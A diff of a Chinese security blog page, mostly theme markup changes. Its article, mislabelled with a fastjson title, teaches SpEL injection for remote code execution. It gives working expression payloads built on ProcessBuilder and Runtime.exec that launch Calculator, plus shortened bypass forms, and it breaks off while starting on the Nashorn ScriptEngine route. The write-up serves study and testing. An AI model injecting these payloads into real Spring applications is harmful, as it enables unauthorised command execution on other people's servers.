@@ -1,7 +1,7 @@
 
 
 <!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+<html lang="zh-CN" data-default-color-scheme=auto>
 
 
 
@@ -9,40 +9,47 @@
   <meta charset="UTF-8">
   <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
   <link rel="icon" href="/img/bg/favicon.png">
-  <meta name="viewport"
-        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="">
   <meta name="author" content="何止">
   <meta name="keywords" content="">
+  
+    <meta name="description" content="前言研究了一下SpEL注入RCE分析以及技巧，做了总结。 SpEL注入基础SpEL简介Spring表达式语言（简称 SpEL，全称Spring Expression Language）是一种功能强大的表达式语言，支持在运行时查询和操作对象图。它语法类似于OGNL，MVEL和JBoss EL，在方法调用和基本的字符串模板提供了极大地便利，也开发减轻了Java代码量。另外 , SpEL是Spring产">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastjson反序列化">
+<meta property="og:url" content="http://example.com/2021/03/11/javasec/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%BB%95%E8%BF%87%E7%A0%94%E7%A9%B6/index.html">
+<meta property="og:site_name" content="何止">
+<meta property="og:description" content="前言研究了一下SpEL注入RCE分析以及技巧，做了总结。 SpEL注入基础SpEL简介Spring表达式语言（简称 SpEL，全称Spring Expression Language）是一种功能强大的表达式语言，支持在运行时查询和操作对象图。它语法类似于OGNL，MVEL和JBoss EL，在方法调用和基本的字符串模板提供了极大地便利，也开发减轻了Java代码量。另外 , SpEL是Spring产">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/bg/default.png">
+<meta property="article:published_time" content="2021-03-11T11:11:00.000Z">
+<meta property="article:modified_time" content="2022-02-22T10:44:48.564Z">
+<meta property="article:author" content="何止">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/bg/default.png">
+  
+  
   
   <title>fastjson反序列化 - 何止</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
 
 
+
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+
   <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
 
-  
-    
-    
-      
-      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
-    
-  
-
-  
-    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
-  
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
 
 
 
 <!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
 
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
 
 
 
@@ -51,24 +58,46 @@
 
 <link  rel="stylesheet" href="/css/main.css" />
 
-<!-- 自定义样式保持在最底部 -->
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
 
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.9-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 5.4.0"></head>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
 
 
 <body>
-  <header style="height: 70vh;">
-    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
-    <a class="navbar-brand"
-       href="/">&nbsp;<strong>何止</strong>&nbsp;</a>
+    <a class="navbar-brand" href="/">
+      <strong>何止</strong>
+    </a>
 
     <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
             data-target="#navbarSupportedContent"
@@ -154,13 +183,15 @@
         
         
           <li class="nav-item" id="search-btn">
-            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
-                class="iconfont icon-search"></i>&nbsp;</a>
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
           </li>
+          
         
         
           <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" href="javascript:">&nbsp;<i
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                 class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
           </li>
         
@@ -169,67 +200,78 @@
   </div>
 </nav>
 
-    <div class="banner" id="banner" parallax=true
-         style="background: url('/img/bg/default.png') no-repeat center center;
-           background-size: cover;">
-      <div class="full-bg-img">
-        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-          <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="fastjson反序列化">
-              
-            </span>
-
-            
-              <div class="mt-3">
-  
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-author" aria-hidden="true"></i>
-      何止
-    </span>
-  
-  
-    <span class="post-meta">
-      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-03-11 19:11" pubdate>
-        2021年3月11日 晚上
-      </time>
-    </span>
-  
-</div>
-
-<div class="mt-1">
-  
-    
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-chart"></i>
-      2.5k 字
-    </span>
   
 
-  
-    
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-clock-fill"></i>
-      
-      
-      44
-       分钟
-    </span>
-  
-
-  
-  
-    
-  
-</div>
-
-            
-          </div>
-
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/bg/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="fastjson反序列化"></span>
           
         </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        何止
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2021-03-11 19:11" pubdate>
+          2021年3月11日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          76 分钟
+        
+      </span>
+    
+
+    
+    
+      
+    
+  </div>
+
+
+        
       </div>
+
+      
     </div>
+  </div>
+</div>
+
+</div>
+
   </header>
 
   <main>
@@ -238,29 +280,38 @@
 
 <div class="container-fluid nopadding-x">
   <div class="row nomargin-x">
-    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
     <div class="col-lg-8 nopadding-x-md">
       <div class="container nopadding-x-md" id="board-ctn">
-        <div class="py-5" id="board">
+        <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
             <h1 style="display: none">fastjson反序列化</h1>
             
               <p class="note note-info">
                 
-                  本文最后更新于：5 个月前
+                  
+                    <!-- compatible with older versions-->
+                    本文最后更新于：5 个月前
+                  
                 
               </p>
             
-            <div class="markdown-body">
-              <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>研究了一下SpEL注入RCE分析以及技巧，做了总结。</p>
+            
+              <div class="markdown-body">
+                
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>研究了一下SpEL注入RCE分析以及技巧，做了总结。</p>
 <h2 id="SpEL注入基础"><a href="#SpEL注入基础" class="headerlink" title="SpEL注入基础"></a>SpEL注入基础</h2><h3 id="SpEL简介"><a href="#SpEL简介" class="headerlink" title="SpEL简介"></a>SpEL简介</h3><p>Spring表达式语言（简称 <strong>SpEL</strong>，全称<strong>Spring Expression Language</strong>）是一种功能强大的表达式语言，支持在运行时查询和操作对象图。它语法类似于OGNL，MVEL和JBoss EL，在方法调用和基本的字符串模板提供了极大地便利，也开发减轻了Java代码量。另外 , SpEL是Spring产品组合中表达评估的基础，但它并不直接与Spring绑定,可以独立使用。</p>
 <h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法:"></a>基本用法:</h3><p> SpEL调用流程 : 1.新建解析器 2.解析表达式 3.注册变量(可省,在取值之前注册) 4.取值</p>
 <p>示例1:不注册新变量的用法</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">ExpressionParser parser = <span class="hljs-keyword">new</span> SpelExpressionParser();<span class="hljs-comment">//创建解析器</span><br>Expression exp = parser.parseExpression(<span class="hljs-string">&quot;&#x27;Hello World&#x27;.concat(&#x27;!&#x27;)&quot;</span>);<span class="hljs-comment">//解析表达式</span><br>System.out.println( exp.getValue() );<span class="hljs-comment">//取值，Hello World！</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<span class="hljs-comment">//创建解析器</span><br><span class="hljs-type">Expression</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> parser.parseExpression(<span class="hljs-string">&quot;&#x27;Hello World&#x27;.concat(&#x27;!&#x27;)&quot;</span>);<span class="hljs-comment">//解析表达式</span><br>System.out.println( exp.getValue() );<span class="hljs-comment">//取值，Hello World！</span><br></code></pre></td></tr></table></figure>
 
 <p>示例2:自定义注册加载变量的用法</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Spel</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> String name = <span class="hljs-string">&quot;何止&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Spel user = <span class="hljs-keyword">new</span> Spel();<br>        StandardEvaluationContext context=<span class="hljs-keyword">new</span> StandardEvaluationContext();<br>        context.setVariable(<span class="hljs-string">&quot;user&quot;</span>,user);<span class="hljs-comment">//通过StandardEvaluationContext注册自定义变量</span><br>        SpelExpressionParser parser = <span class="hljs-keyword">new</span> SpelExpressionParser();<span class="hljs-comment">//创建解析器</span><br>        Expression expression = parser.parseExpression(<span class="hljs-string">&quot;#user.name&quot;</span>);<span class="hljs-comment">//解析表达式</span><br>        System.out.println( expression.getValue(context).toString() );<span class="hljs-comment">//取值,输出何止</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Spel</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;何止&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Spel</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Spel</span>();<br>        StandardEvaluationContext context=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardEvaluationContext</span>();<br>        context.setVariable(<span class="hljs-string">&quot;user&quot;</span>,user);<span class="hljs-comment">//通过StandardEvaluationContext注册自定义变量</span><br>        <span class="hljs-type">SpelExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<span class="hljs-comment">//创建解析器</span><br>        <span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> parser.parseExpression(<span class="hljs-string">&quot;#user.name&quot;</span>);<span class="hljs-comment">//解析表达式</span><br>        System.out.println( expression.getValue(context).toString() );<span class="hljs-comment">//取值,输出何止</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>了解了基本用法之后，我们可以通过创建实例，调用方法先构造几个rce的payload</p>
 <p><strong>会用到的语法</strong></p>
@@ -268,47 +319,47 @@
 <p>spel中的<code>#</code>操作符可以用于标记对象</p>
 <h2 id="RCE第一部分"><a href="#RCE第一部分" class="headerlink" title="RCE第一部分"></a>RCE第一部分</h2><p>第一部分就是最基础的思路 : 新建实例 , 调用命令执行方法</p>
 <h3 id="01-调用ProcessBuilder"><a href="#01-调用ProcessBuilder" class="headerlink" title="01 : 调用ProcessBuilder"></a>01 : 调用ProcessBuilder</h3><p>java代码</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">String[] str = <span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;open&quot;</span>,<span class="hljs-string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;;<br>ProcessBuilder p = <span class="hljs-keyword">new</span> ProcessBuilder( str );<br>p.start();<span class="hljs-comment">//打开计算器</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">String[] str = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;open&quot;</span>,<span class="hljs-string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;;<br><span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>( str );<br>p.start();<span class="hljs-comment">//打开计算器</span><br></code></pre></td></tr></table></figure>
 
 <p>spel中也可以使用new来构造，写法几乎一样，我们可以把表达式简化为一行</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> java.lang.ProcessBuilder(<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;open&quot;</span>,<span class="hljs-string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;).start()<br></code></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.ProcessBuilder(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;open&quot;</span>,<span class="hljs-string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;).start()<br></code></pre></td></tr></table></figure>
 
 <p>完整的执行代码</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"> String cmdStr = <span class="hljs-string">&quot;new java.lang.ProcessBuilder(new String[]&#123;\&quot;open\&quot;,\&quot;/System/Applications/Calculator.app\&quot;&#125;).start()&quot;</span>;<br><br>ExpressionParser parser = <span class="hljs-keyword">new</span> SpelExpressionParser();<span class="hljs-comment">//创建解析器</span><br>Expression exp = parser.parseExpression(cmdStr);<span class="hljs-comment">//解析表达式</span><br>System.out.println( exp.getValue() );<span class="hljs-comment">//弹出计算器</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-type">String</span> <span class="hljs-variable">cmdStr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;new java.lang.ProcessBuilder(new String[]&#123;\&quot;open\&quot;,\&quot;/System/Applications/Calculator.app\&quot;&#125;).start()&quot;</span>;<br><br><span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<span class="hljs-comment">//创建解析器</span><br><span class="hljs-type">Expression</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> parser.parseExpression(cmdStr);<span class="hljs-comment">//解析表达式</span><br>System.out.println( exp.getValue() );<span class="hljs-comment">//弹出计算器</span><br></code></pre></td></tr></table></figure>
 
 <p>当然java.lang包下的类无需使用全限定类名,故表达式可简化来bypass</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> ProcessBuilder(<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;open&quot;</span>,<span class="hljs-string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;).start()<br></code></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;open&quot;</span>,<span class="hljs-string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;).start()<br></code></pre></td></tr></table></figure>
 
 
 
 <h3 id="02-调用RunTime"><a href="#02-调用RunTime" class="headerlink" title="02 : 调用RunTime"></a>02 : 调用RunTime</h3><p>java调用，由于Runtime类使用了单例模式-饿汉式，需要调用Runtime的静态方法得到Runtime实例</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Runtime rt = Runtime.getRuntime();<span class="hljs-comment">//</span><br>rt.exec(<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;open&quot;</span>,<span class="hljs-string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;);<br></code></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Runtime</span> <span class="hljs-variable">rt</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<span class="hljs-comment">//</span><br>rt.exec(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;open&quot;</span>,<span class="hljs-string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;);<br></code></pre></td></tr></table></figure>
 
 <p>和上个用法略有不同解释在payload后给出</p>
 <p>使用string参数 (java.lang包下的类不需要加全限定类名)</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;open /System/Applications/Calculator.app&quot;</span>)<br></code></pre></td></tr></table></figure>
 
 <p>字符串数组方法调用</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">T(Runtime).getRuntime().exec(<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;open&quot;</span>,<span class="hljs-string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;)<br></code></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">T(Runtime).getRuntime().exec(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;open&quot;</span>,<span class="hljs-string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;)<br></code></pre></td></tr></table></figure>
 
 <p>解释: 由于<code>RunTime类</code>使用了单例模式 ,获取对象的话不能直接通过构造方法获得,必须通过静态方法<code>getRuntime</code>来获得 , 其源码可参考下图 , 调用静态方法的话需要使用SpEL的<code>T()</code>操作符,<code>T()</code>操作符会返回一个object.</p>
 <p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210226065405-5c7901e4-77bc-1.jpg" srcset="/img/loading.gif" lazyload alt="image-20210224010602445"></p>
 <h3 id="03-调用ScriptEngine"><a href="#03-调用ScriptEngine" class="headerlink" title="03 : 调用ScriptEngine"></a>03 : 调用ScriptEngine</h3><p>从<strong>ruilin</strong>师傅的文章学到还可以用js引擎(不知道能不能用颜文字或者其他js绕过的方法到这里，暂时没实验成功，测试成的师傅可以分享下).</p>
 <p>获取所有js引擎信息</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        ScriptEngineManager manager = <span class="hljs-keyword">new</span> ScriptEngineManager();<br>        List&lt;ScriptEngineFactory&gt; factories = manager.getEngineFactories();<br>        <span class="hljs-keyword">for</span> (ScriptEngineFactory factory: factories)&#123;<br>                System.out.printf(<br>                    <span class="hljs-string">&quot;Name: %s%n&quot;</span> + <span class="hljs-string">&quot;Version: %s%n&quot;</span> + <span class="hljs-string">&quot;Language name: %s%n&quot;</span> +<br>                    <span class="hljs-string">&quot;Language version: %s%n&quot;</span> +<br>                    <span class="hljs-string">&quot;Extensions: %s%n&quot;</span> +<br>                    <span class="hljs-string">&quot;Mime types: %s%n&quot;</span> +<br>                    <span class="hljs-string">&quot;Names: %s%n&quot;</span>,<br>                    factory.getEngineName(),<br>                    factory.getEngineVersion(),<br>                    factory.getLanguageName(),<br>                    factory.getLanguageVersion(),<br>                    factory.getExtensions(),<br>                    factory.getMimeTypes(),<br>                    factory.getNames()<br>                );<br>        &#125;<br> &#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">ScriptEngineManager</span> <span class="hljs-variable">manager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ScriptEngineManager</span>();<br>        List&lt;ScriptEngineFactory&gt; factories = manager.getEngineFactories();<br>        <span class="hljs-keyword">for</span> (ScriptEngineFactory factory: factories)&#123;<br>                System.out.printf(<br>                    <span class="hljs-string">&quot;Name: %s%n&quot;</span> + <span class="hljs-string">&quot;Version: %s%n&quot;</span> + <span class="hljs-string">&quot;Language name: %s%n&quot;</span> +<br>                    <span class="hljs-string">&quot;Language version: %s%n&quot;</span> +<br>                    <span class="hljs-string">&quot;Extensions: %s%n&quot;</span> +<br>                    <span class="hljs-string">&quot;Mime types: %s%n&quot;</span> +<br>                    <span class="hljs-string">&quot;Names: %s%n&quot;</span>,<br>                    factory.getEngineName(),<br>                    factory.getEngineVersion(),<br>                    factory.getLanguageName(),<br>                    factory.getLanguageVersion(),<br>                    factory.getExtensions(),<br>                    factory.getMimeTypes(),<br>                    factory.getNames()<br>                );<br>        &#125;<br> &#125;<br></code></pre></td></tr></table></figure>
 
 <blockquote>
 <p>  Name: Oracle Nashorn<br>  Version: 1.8.0_261<br>  Language name: ECMAScript<br>  Language version: ECMA - 262 Edition 5.1<br>  Extensions: [js]<br>  Mime types: [application/javascript, application/ecmascript, text/javascript, text/ecmascript]<br>  <strong>Names: [nashorn, Nashorn, js, JS, JavaScript, javascript, ECMAScript, ecmascript]</strong></p>
 </blockquote>
 <p>通过结果中的Names，我们知道了所有的js引擎名称故getEngineByName的参数可以填<code>[nashorn, Nashorn, js, JS, JavaScript, javascript, ECMAScript, ecmascript]</code>,举个例子:</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">ScriptEngineManager sem = <span class="hljs-keyword">new</span> ScriptEngineManager();<br>ScriptEngine engine = sem.getEngineByName(<span class="hljs-string">&quot;nashorn&quot;</span>);<br>System.out.println(engine.eval(<span class="hljs-string">&quot;2+1&quot;</span>));<br></code></pre></td></tr></table></figure>
